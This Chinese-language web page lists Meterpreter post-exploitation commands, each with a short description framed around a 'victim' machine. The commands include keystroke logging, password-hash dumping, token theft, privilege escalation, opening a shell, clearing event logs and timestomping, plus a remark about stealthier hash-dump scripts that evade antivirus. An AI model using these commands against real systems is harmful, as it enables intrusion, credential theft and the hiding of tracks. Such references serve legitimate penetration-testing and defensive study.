  <h1 class="passage-title">
    meterpreter命令大全
  </h1>
  
  <article class="passage-article">
    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"></span><br><span class="line">meterpreter命令大全</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">    ? – 帮助菜单</span><br><span class="line">    background – 将当前会话移动到背景</span><br><span class="line">    bgkill – 杀死一个背景 meterpreter 脚本</span><br><span class="line">    bglist – 提供所有正在运行的后台脚本的列表</span><br><span class="line">    bgrun – 作为一个后台线程运行脚本</span><br><span class="line">    channel – 显示活动频道</span><br><span class="line">    close – 关闭通道</span><br><span class="line">    exit – 终止 meterpreter 会话</span><br><span class="line">    help – 帮助菜单</span><br><span class="line">    interact – 与通道进行交互</span><br><span class="line">    irb – 进入 Ruby 脚本模式</span><br><span class="line">    migrate – 移动到一个指定的 PID 的活动进程</span><br><span class="line">    quit – 终止 meterpreter 会话</span><br><span class="line">    read – 从通道读取数据</span><br><span class="line">    run – 执行以后它选定的 meterpreter 脚本</span><br><span class="line">    use – 加载 meterpreter 的扩展</span><br><span class="line">    write – 将数据写入到一个通道</span><br><span class="line"></span><br><span class="line">第2步：文件系统命令</span><br><span class="line"></span><br><span class="line">    cat -读取并输出到标准输出文件的内容</span><br><span class="line">    cd -更改目录对受害人</span><br><span class="line">    del -删除文件对受害人</span><br><span class="line">    download-从受害者系统文件下载</span><br><span class="line">    edit-用 vim编辑文件</span><br><span class="line">    getlwd -打印本地目录</span><br><span class="line">    getwd -打印工作目录</span><br><span class="line">    lcd -更改本地目录</span><br><span class="line">    lpwd -打印本地目录</span><br><span class="line">    ls -列出在当前目录中的文件列表</span><br><span class="line">    mkdir -在受害者系统上的创建目录</span><br><span class="line">    pwd -输出工作目录</span><br><span class="line">    rm -删除文件</span><br><span class="line">    rmdir -受害者系统上删除目录</span><br><span class="line">    upload-从攻击者的系统往受害者系统上传文件</span><br><span class="line"></span><br><span class="line">第 3 步： 网络命令</span><br><span class="line"></span><br><span class="line">    ipconfig -显示网络接口的关键信息，包括 IP 地址、 等。</span><br><span class="line">    portfwd -端口转发</span><br><span class="line">    route -查看或修改受害者路由表</span><br><span class="line"></span><br><span class="line">第 4 步： 系统命令</span><br><span class="line"></span><br><span class="line">    clearav -清除了受害者的计算机上的事件日志</span><br><span class="line">    drop_token -被盗的令牌</span><br><span class="line">    execute-执行命令</span><br><span class="line">    getpid -获取当前进程 ID (PID)</span><br><span class="line">    getprivs -尽可能获取尽可能多的特权</span><br><span class="line">    getuid -获取作为运行服务器的用户</span><br><span class="line">    kill -终止指定 PID 的进程</span><br><span class="line">    ps -列出正在运行的进程</span><br><span class="line">    reboot-重新启动受害人的计算机</span><br><span class="line">    reg -与受害人的注册表进行交互</span><br><span class="line">    rev2self -在受害者机器上调用 RevertToSelf()</span><br><span class="line">    shell -在受害者计算机上打开一个shell</span><br><span class="line">    shutdown-关闭了受害者的计算机</span><br><span class="line">    steal_token -试图窃取指定的 (PID) 进程的令牌</span><br><span class="line">    sysinfo -获取有关受害者计算机操作系统和名称等的详细信息</span><br><span class="line"></span><br><span class="line">第 5 步： 用户界面命令</span><br><span class="line"></span><br><span class="line">    enumdesktops -列出所有可访问台式机</span><br><span class="line">    getdesktop -获取当前的 meterpreter 桌面</span><br><span class="line">    idletime -检查长时间以来，受害者系统空闲进程</span><br><span class="line">    keyscan_dump -键盘记录软件的内容转储</span><br><span class="line">    keyscan_start -启动时与如 Word 或浏览器的进程相关联的键盘记录软件</span><br><span class="line">    keyscan_stop -停止键盘记录软件</span><br><span class="line">    screenshot-抓去 meterpreter 桌面的屏幕截图</span><br><span class="line">    set_desktop -更改 meterpreter 桌面</span><br><span class="line">    uictl -启用用户界面组件的一些控件</span><br><span class="line"></span><br><span class="line">第 6 步： 特权升级命令</span><br><span class="line"></span><br><span class="line">    getsystem -获得系统管理员权限</span><br><span class="line"></span><br><span class="line">第 7 步： 密码转储命令</span><br><span class="line"></span><br><span class="line">    hashdump -抓去哈希密码 (SAM) 文件中的值</span><br><span class="line"></span><br><span class="line">　　  请注意 hashdump 会可以跳过杀毒软件，但现在有两个脚本，都更加隐蔽，”run hashdump”和”run smart_hashdump”。查找更多关于那些在我即将举行的 meterpreter 脚本作弊。</span><br><span class="line"></span><br><span class="line">第 8 步： Timestomp 命令</span><br><span class="line"></span><br><span class="line">    timestomp -操作修改，访问，并创建一个文件的属性</span><br></pre></td></tr></table></figure>

  </article>
